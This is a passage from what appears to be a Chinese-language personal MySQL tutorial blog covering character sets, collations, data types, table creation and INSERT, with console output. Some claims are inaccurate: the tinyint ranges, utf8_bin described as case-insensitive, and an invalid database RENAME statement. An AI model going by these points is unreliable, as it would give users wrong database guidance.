<span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> macce    <span class="hljs-operator">|</span> Mac Central European            <span class="hljs-operator">|</span> macce_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> macroman <span class="hljs-operator">|</span> Mac West European               <span class="hljs-operator">|</span> macroman_general_ci <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sjis     <span class="hljs-operator">|</span> Shift<span class="hljs-operator">-</span>JIS Japanese              <span class="hljs-operator">|</span> sjis_japanese_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> swe7     <span class="hljs-operator">|</span> <span class="hljs-number">7</span>bit Swedish                    <span class="hljs-operator">|</span> swe7_swedish_ci     <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> tis620   <span class="hljs-operator">|</span> TIS620 Thai                     <span class="hljs-operator">|</span> tis620_thai_ci      <span class="hljs-operator">|</span>      <span class="hljs-number">1</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> ucs2     <span class="hljs-operator">|</span> UCS<span class="hljs-number">-2</span> Unicode                   <span class="hljs-operator">|</span> ucs2_general_ci     <span class="hljs-operator">|</span>      <span class="hljs-number">2</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> ujis     <span class="hljs-operator">|</span> EUC<span class="hljs-operator">-</span>JP Japanese                 <span class="hljs-operator">|</span> ujis_japanese_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> utf16    <span class="hljs-operator">|</span> UTF<span class="hljs-number">-16</span> Unicode                  <span class="hljs-operator">|</span> utf16_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">4</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> utf16le  <span class="hljs-operator">|</span> UTF<span class="hljs-number">-16</span>LE Unicode                <span class="hljs-operator">|</span> utf16le_general_ci  <span class="hljs-operator">|</span>      <span class="hljs-number">4</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> utf32    <span class="hljs-operator">|</span> UTF<span class="hljs-number">-32</span> Unicode                  <span class="hljs-operator">|</span> utf32_general_ci    <span class="hljs-operator">|</span>      <span class="hljs-number">4</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> utf8mb3  <span class="hljs-operator">|</span> UTF<span class="hljs-number">-8</span> Unicode                   <span class="hljs-operator">|</span> utf8mb3_general_ci  <span class="hljs-operator">|</span>      <span class="hljs-number">3</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> utf8mb4  <span class="hljs-operator">|</span> UTF<span class="hljs-number">-8</span> Unicode                   <span class="hljs-operator">|</span> utf8mb4_0900_ai_ci  <span class="hljs-operator">|</span>      <span class="hljs-number">4</span> <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------+---------------------------------+---------------------+--------+</span><br></code></pre></td></tr></table></figure><p>配置字符集：服务端、客户端等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">vim <span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>my.cnf<br>[mysqld]<br><span class="hljs-keyword">default</span><span class="hljs-operator">-</span><span class="hljs-type">character</span><span class="hljs-operator">-</span><span class="hljs-keyword">set</span><span class="hljs-operator">=</span>utf8mb4<br><br>[mysql]<span class="hljs-operator">/</span>[client]<br><span class="hljs-keyword">default</span><span class="hljs-operator">-</span><span class="hljs-type">character</span><span class="hljs-operator">-</span><span class="hljs-keyword">set</span><span class="hljs-operator">=</span>utf8mb4<br></code></pre></td></tr></table></figure><p>查看排序规则，基本用的都是uft8mb4的排序规则，一般来说，字符集绑定了排序规则使用；排序规则也可以修改，涉及到你查询表内的记录，数据是如何排序的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;collation%&#x27;</span><br>(root<span class="hljs-variable">@localhost</span>) [mysql]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;collation%&#x27;</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+--------------------+</span><br><span class="hljs-operator">|</span> Variable_name        <span class="hljs-operator">|</span> <span class="hljs-keyword">Value</span>              <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+--------------------+</span><br><span class="hljs-operator">|</span> collation_connection <span class="hljs-operator">|</span> utf8mb4_0900_ai_ci <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> collation_database   <span class="hljs-operator">|</span> utf8mb4_0900_ai_ci <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> collation_server     <span class="hljs-operator">|</span> utf8mb4_0900_ai_ci <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----------------------+--------------------+</span><br><span class="hljs-number">3</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h2 id="2-管理数据库，字符集，排序"><a href="#2-管理数据库，字符集，排序" class="headerlink" title="2.管理数据库，字符集，排序"></a>2.管理数据库，字符集，排序</h2><p>show：查看</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查看数据库，表<br><span class="hljs-keyword">show</span> databases<br><span class="hljs-keyword">show</span> tables<br></code></pre></td></tr></table></figure><p>CREATE：创建，不能创建已经存在的库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">##创建数据库，指定字符集<br><span class="hljs-keyword">create</span> database catyer <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8mb4;<br><br>##创建数据库，指定字符集，指定排序规则，不同的服务可能排序规则不同<br>utf8_bin：忽略大小写<br><span class="hljs-keyword">create</span> database catyer <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8mb4 <span class="hljs-keyword">collate</span> utf8_bin;<br></code></pre></td></tr></table></figure><p>alter修改数据库的字符集</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">##先<span class="hljs-keyword">show</span>查看数据库的属性，默认字符集为utf8mb4<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> database catyer<br>catyer   <span class="hljs-operator">|</span> <span class="hljs-keyword">CREATE</span> DATABASE `catyer` <span class="hljs-comment">/*!40100 DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci */</span> <span class="hljs-comment">/*!80016 DEFAULT ENCRYPTION=&#x27;N&#x27; */</span> <br><br>##修改字符集<br><span class="hljs-keyword">alter</span> database catyer charset utf8<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">create</span> database catyer<br></code></pre></td></tr></table></figure><p>DROP：删除数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">DROP</span> database catyer;<br></code></pre></td></tr></table></figure><h2 id="3-数据类型"><a href="#3-数据类型" class="headerlink" title="3.数据类型"></a>3.数据类型</h2><p>整数</p><p><img src="2792175-20220828181325783-194993639.png" alt="image-20220814230414957"></p><p>常见的数据类型：根据业务的需求，业务数据的需求选择数据类型定义</p><p>INT：整数，unsigned：表示非负数</p><p>tinyint：0-128数字，2的8-1=7次方</p><p>float：浮点数</p><p>char：字符串，定长字符串</p><p>varchar：变长字符串</p><p>date、time：日期，时间</p><p>各种修饰符：空NULL，非空NOT NULL，DEFAULT默认值等</p><p>主键PK，唯一键UK等</p><p>AUTO_INCREMENT：定义数字自动增长</p><p><img src="https://img2022.cnblogs.com/blog/2792175/202208/2792175-20220828181326257-802938955.png" alt="image-20220815212142133"></p><h3 id="char和varchar的区别"><a href="#char和varchar的区别" class="headerlink" title="char和varchar的区别"></a>char和varchar的区别</h3><p>char是定长，如果超过字符，则截断；存abcd，占4个字节，存abcdef，只能存到abcd</p><p>varchar：变长，存abcd，则存abcd，占5个字节</p><p>所以还是看业务数据类型的，比如定长数据，可以使用char(5)，如果是不确定的长度，还是用varchar好一点</p><h3 id="几种INT对比"><a href="#几种INT对比" class="headerlink" title="几种INT对比"></a>几种INT对比</h3><p>tinyint：占一个字节，也就是2的8次方个B，0-256数字</p><p>smallint：2个字节，可以放2的16次方=65536个数字</p><p>INT：占4个字节，2的32次方</p><h2 id="4-管理库表DDL"><a href="#4-管理库表DDL" class="headerlink" title="4.管理库表DDL"></a>4.管理库表DDL</h2><p>一个表在磁盘上就是一个数据库目录内的一个文件，需要到对应的数据库目录下才能看到，这里就是表文件</p><p><img src="2792175-20220828181326595-1757571807.png" alt="image-20220815215816693"></p><h3 id="查看表show"><a href="#查看表show" class="headerlink" title="查看表show"></a>查看表show</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql">##查询<br><span class="hljs-keyword">select</span> 字段 <span class="hljs-keyword">from</span> <span class="hljs-keyword">table</span><br><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> xxx<br><span class="hljs-keyword">create</span> database xxx<br><br>##以竖行的形式显示所有表的信息状态，可以查看一些例如存储引擎，创建时间，字符集<span class="hljs-operator">+</span>排序规则等<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">table</span> status\G;<br><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span> <span class="hljs-number">1.</span> <span class="hljs-type">row</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><span class="hljs-operator">*</span><br>           Name: student<br>         Engine: InnoDB<br>        Version: <span class="hljs-number">10</span><br>     Row_format: <span class="hljs-keyword">Dynamic</span><br>           <span class="hljs-keyword">Rows</span>: <span class="hljs-number">0</span><br> Avg_row_length: <span class="hljs-number">0</span><br>    Data_length: <span class="hljs-number">16384</span><br>Max_data_length: <span class="hljs-number">0</span><br>   Index_length: <span class="hljs-number">0</span><br>      Data_free: <span class="hljs-number">0</span><br> Auto_increment: <span class="hljs-keyword">NULL</span><br>    Create_time: <span class="hljs-number">2022</span><span class="hljs-number">-08</span><span class="hljs-number">-15</span> <span class="hljs-number">21</span>:<span class="hljs-number">47</span>:<span class="hljs-number">56</span><br>    Update_time: <span class="hljs-keyword">NULL</span><br>     Check_time: <span class="hljs-keyword">NULL</span><br>      <span class="hljs-keyword">Collation</span>: utf8mb4_0900_ai_ci<br>       Checksum: <span class="hljs-keyword">NULL</span><br> Create_options: <br>        Comment: <br></code></pre></td></tr></table></figure><h3 id="基本的创建表操作"><a href="#基本的创建表操作" class="headerlink" title="基本的创建表操作"></a>基本的创建表操作</h3><p>一般来说都是规定好表结构，字段数据类型等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql">##管理表<br><span class="hljs-keyword">show</span> tables;<br><br>##删除表<br><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> catyer;<br><br>##创建一个学生表<br>##id字段tinyint0<span class="hljs-number">-256</span>数字，非负，非空，还是主键，自增长<br>##名字：字符<span class="hljs-number">4</span>个，非空<br>##性别：male <span class="hljs-keyword">or</span> female，<span class="hljs-number">6</span>个字符<br>##年龄：<span class="hljs-number">0</span><span class="hljs-number">-256</span>，非空<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> student (<br>id tinyint unsigned <span class="hljs-keyword">primary</span> key auto_increment,<br>name <span class="hljs-type">char</span>(<span class="hljs-number">4</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>sex <span class="hljs-type">char</span>(<span class="hljs-number">6</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>,<br>age tinyint unsigned<br>);<br><br>##查看表结构：<span class="hljs-keyword">desc</span>，这个表有<span class="hljs-number">4</span>个字段，<span class="hljs-number">4</span>个域field，字段类型，是否为空，默认值是什么，EXTRA额外的属性：比如自增长 <br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">desc</span> student;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> Field <span class="hljs-operator">|</span> Type             <span class="hljs-operator">|</span> <span class="hljs-keyword">Null</span> <span class="hljs-operator">|</span> Key <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-operator">|</span> Extra          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> id    <span class="hljs-operator">|</span> tinyint unsigned <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span> PRI <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> auto_increment <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> name  <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">4</span>)          <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sex   <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">6</span>)          <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> age   <span class="hljs-operator">|</span> tinyint unsigned <span class="hljs-operator">|</span> YES  <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-number">4</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>AS：根据另一张表的查询结果创建目标表，等于将查询到的特定字段的值创建成了表，包括复制表结构和查询出来的数据</p><p>AS可以省略</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">##在catyer库内创建<span class="hljs-keyword">user</span>表<br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> mysql.user;<br>Query OK, <span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br>Records: <span class="hljs-number">5</span>  Duplicates: <span class="hljs-number">0</span>  Warnings: <span class="hljs-number">0</span><br><br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.infoschema <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.session    <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.sys        <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-number">5</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><p>LIKE：创建一个表结构一样的表，LIKE表没有数据，只有一样的结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> user_like <span class="hljs-keyword">like</span> <span class="hljs-keyword">user</span>;<br>##两张表的表结构是一致的，HOST定义是<span class="hljs-number">255</span>个字符<br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">desc</span> <span class="hljs-keyword">user</span>;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-----------+------+-----+---------+-------+</span><br><span class="hljs-operator">|</span> Field <span class="hljs-operator">|</span> Type      <span class="hljs-operator">|</span> <span class="hljs-keyword">Null</span> <span class="hljs-operator">|</span> Key <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-operator">|</span> Extra <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-----------+------+-----+---------+-------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>  <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">32</span>)  <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> host  <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">255</span>) <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-----------+------+-----+---------+-------+</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">desc</span> user_like;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-----------+------+-----+---------+-------+</span><br><span class="hljs-operator">|</span> Field <span class="hljs-operator">|</span> Type      <span class="hljs-operator">|</span> <span class="hljs-keyword">Null</span> <span class="hljs-operator">|</span> Key <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-operator">|</span> Extra <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-----------+------+-----+---------+-------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>  <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">32</span>)  <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> host  <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">255</span>) <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span>         <span class="hljs-operator">|</span>       <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+-----------+------+-----+---------+-------+</span><br><span class="hljs-number">2</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.01</span> sec)<br></code></pre></td></tr></table></figure><h3 id="表、库重命名rename"><a href="#表、库重命名rename" class="headerlink" title="表、库重命名rename"></a>表、库重命名rename</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">ALTER</span>  <span class="hljs-keyword">TABLE</span> table_name RENAME <span class="hljs-keyword">TO</span> new_table_name<br><span class="hljs-keyword">ALTER</span>  <span class="hljs-keyword">TABLE</span> students RENAME <span class="hljs-keyword">TO</span> stu;<br><span class="hljs-keyword">ALTER</span>  database students RENAME <span class="hljs-keyword">TO</span> stu;<br></code></pre></td></tr></table></figure><h2 id="5-DML语句"><a href="#5-DML语句" class="headerlink" title="5.DML语句"></a>5.DML语句</h2><h3 id="insert插入语句"><a href="#insert插入语句" class="headerlink" title="insert插入语句"></a>insert插入语句</h3><p>一定要与表内的字段匹配，包括插入的顺序，可以先DESC一下表格，一般都是跑.sql的脚本</p><p>注意字符集：如果是latin，那仅仅只支持英文输入；如果是uft8mb4，则支持中文英文，是世界通用的字符集</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sql">##基本语法<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> table_name;<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">table</span>; <span class="hljs-keyword">into</span>可以省略<br><span class="hljs-keyword">desc</span> table_name;<br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">desc</span> student;<br><span class="hljs-operator">+</span><span class="hljs-comment">-------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> Field <span class="hljs-operator">|</span> Type             <span class="hljs-operator">|</span> <span class="hljs-keyword">Null</span> <span class="hljs-operator">|</span> Key <span class="hljs-operator">|</span> <span class="hljs-keyword">Default</span> <span class="hljs-operator">|</span> Extra          <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-operator">|</span> id    <span class="hljs-operator">|</span> tinyint unsigned <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span> PRI <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span> auto_increment <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> name  <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">4</span>)          <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sex   <span class="hljs-operator">|</span> <span class="hljs-type">char</span>(<span class="hljs-number">6</span>)          <span class="hljs-operator">|</span> <span class="hljs-keyword">NO</span>   <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> age   <span class="hljs-operator">|</span> tinyint unsigned <span class="hljs-operator">|</span> YES  <span class="hljs-operator">|</span>     <span class="hljs-operator">|</span> <span class="hljs-keyword">NULL</span>    <span class="hljs-operator">|</span>                <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">-------+------------------+------+-----+---------+----------------+</span><br><span class="hljs-number">4</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br><br>##要和字段匹配，以及<span class="hljs-type">char</span>字符的限制，不能超过<span class="hljs-type">char</span>(<span class="hljs-number">4</span>)的限制<br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> student <span class="hljs-keyword">values</span>(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;cat&#x27;</span>,<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;25&#x27;</span>);<br>Query OK, <span class="hljs-number">1</span> <span class="hljs-type">row</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>(root<span class="hljs-variable">@localhost</span>) [catyer]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> student;<br><span class="hljs-operator">+</span><span class="hljs-comment">----+------+-----+------+</span><br><span class="hljs-operator">|</span> id <span class="hljs-operator">|</span> name <span class="hljs-operator">|</span> sex <span class="hljs-operator">|</span> age  <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">----+------+-----+------+</span><br><span class="hljs-operator">|</span>  <span class="hljs-number">1</span> <span class="hljs-operator">|</span> cat  